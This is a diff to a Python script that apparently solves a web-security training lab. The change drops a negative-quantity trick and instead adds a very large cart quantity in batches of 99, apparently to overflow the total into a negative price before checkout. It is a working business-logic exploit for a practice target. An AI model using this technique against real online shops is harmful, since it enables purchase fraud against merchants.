@@ -94,11 +94,16 @@ def main():
         prod_id += 1
         price2 = get_price(s, url, f'/product?productId={prod_id}')
     
-    quantity1 = 1
-    quantity2 = int(price1 / price2)
-
-    add_prod_to_cart(s, url, '/cart', 1, quantity1)
-    add_prod_to_cart(s, url, '/cart', 2, -quantity2)
+    quantity1 = 32123   # Pre calculate by burp intruder
+    quantity2 = int(1221.96 // price2) + 1   # Maybe it always left -$1221.96 after adding product 1
+    while quantity1:
+        add_prod_to_cart(s, url, '/cart', 1, min(99, quantity1))
+        quantity1 -= min(99, quantity1)
+        print(f'[..] Current have {quantity1} product left need to add')
+    while quantity2:
+        add_prod_to_cart(s, url, '/cart', 2, min(99, quantity2))
+        quantity2 -= min(99, quantity2)
+        print(f'[..] Current have {quantity2} product left need to add')
     checkout_prod(s, url, '/cart/checkout')
     check_solved_lab(s, url)
 
